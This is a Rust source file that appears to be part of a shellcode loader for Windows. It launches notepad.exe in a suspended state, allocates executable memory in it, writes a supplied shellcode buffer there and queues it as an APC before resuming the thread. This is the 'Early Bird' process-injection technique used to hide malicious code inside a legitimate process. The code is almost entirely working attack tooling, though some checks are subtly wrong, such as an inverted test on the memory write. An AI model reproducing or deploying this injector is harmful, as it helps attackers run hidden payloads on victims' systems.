use crate::{error_occured, utils::SHELLOCODE_LEN};
use std::{ffi::CString, ptr};

use errhandlingapi::GetLastError;
use handleapi::CloseHandle;
use memoryapi::{VirtualAllocEx, VirtualFree, VirtualProtectEx, WriteProcessMemory};
use processthreadsapi::{CreateProcessA, QueueUserAPC, ResumeThread, PROCESS_INFORMATION, STARTUPINFOA};
use winapi::{shared::minwindef::DWORD, um::*};
use colored::{*};
use winbase::CREATE_SUSPENDED;
use winnt::{MEM_COMMIT, MEM_RELEASE, PAGE_EXECUTE_READWRITE, PAPCFUNC};

impl crate::utils::Ushellcode {
    pub fn new_shellcode(shellcode : [u8; SHELLOCODE_LEN]) -> Self {
        Self {
            shellcode
        }
    }

    pub fn inject(&mut self) {

        let p_shellcode: *const winapi::ctypes::c_void = self.shellcode.as_ptr() as *const winapi::ctypes::c_void;

        let notepad_path : CString = match CString::new("C:\\Windows\\System32\\notepad.exe") {
            Ok(n_process) => n_process,
            Err(_) => {
                error_occured!("CString");
                return;
            }
        };

        let mut si : STARTUPINFOA = unsafe { std::mem::zeroed() };
        si.cb =   std::mem::size_of::<STARTUPINFOA>() as u32;

        let mut pi : PROCESS_INFORMATION = unsafe { std::mem::zeroed() };


        let notepad_process_suspended = unsafe {
            CreateProcessA(
                notepad_path.as_ptr(),
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
                0,
                CREATE_SUSPENDED,
                ptr::null_mut(),
                ptr::null_mut(),
                &mut si,
                &mut pi
            )
        };

        if notepad_process_suspended == 0 {
            error_occured!("CreateProcessA");
            return;
        }

        let pid = pi.dwProcessId;
        println!("{}[{pid}]", "[+] Create process".green());

        let v_alloc = unsafe {
            VirtualAllocEx(
                pi.hProcess,
                ptr::null_mut(),
                SHELLOCODE_LEN,
                MEM_COMMIT,
                PAGE_EXECUTE_READWRITE,
            )
        };
        
        if v_alloc == ptr::null_mut() {
            error_occured!("v_alloc");
            return;
        }
        
        println!("{} [{:p}]", "[+] Memory allocated successfully".green(), v_alloc);
        
        println!("{}", "[+] Write Shellcode into memory".green());
        
        let write_alloc_mem = unsafe {
            WriteProcessMemory(
                pi.hProcess,
                v_alloc,
                p_shellcode,
                SHELLOCODE_LEN,
                ptr::null_mut()
            )
        };
        
        if write_alloc_mem != 0 {
            error_occured!("write_alloc_mem");
            return;
        }
        
        let mut old_protect: DWORD = 0;
        let protect_res = unsafe {
            VirtualProtectEx(
                pi.hProcess,
                v_alloc,
                SHELLOCODE_LEN,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect
            )
        };
        
        if protect_res == 0 {
            println!("{} {}", "[-] Failed to set memory protection".red(), unsafe { GetLastError() });
            return;
        }
        
        let _apc_res = unsafe {
            QueueUserAPC(
                PAPCFUNC::Some(std::mem::transmute(v_alloc)),
                pi.hThread,
                0
            )
        };
        
        println!("{} [{}]", "[+] Resume thread".green(), pid);
        let _resume_thread = unsafe { ResumeThread(pi.hThread) };
        
        if !v_alloc.is_null() {
            println!("{} [v_alloc: {:p}]", "[+] Attempting to free memory".green(), v_alloc);
            let free = unsafe { VirtualFree(v_alloc, 0, MEM_RELEASE) };
            
            if free == 0 {
                println!("{} {}", "[-] Failed to cleanup resource".red(), unsafe { GetLastError() });
            } else {
                println!("{}", "[+] Memory successfully freed".green());
            }
        }
        
        unsafe {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        

    }
}